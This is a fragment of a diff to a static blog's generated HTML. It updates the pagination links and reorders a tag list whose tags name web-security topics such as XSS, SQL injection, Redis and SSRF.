+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+    </nav>
   
 
 
@@ -1627,14 +1617,6 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">SQL注入</a>
               </li>
              
@@ -1644,6 +1626,22 @@ MathJax.Hub.Queue(function() {
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Redis</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">SSRF</a>
               </li>
             
             <div class="clearfix"></div>
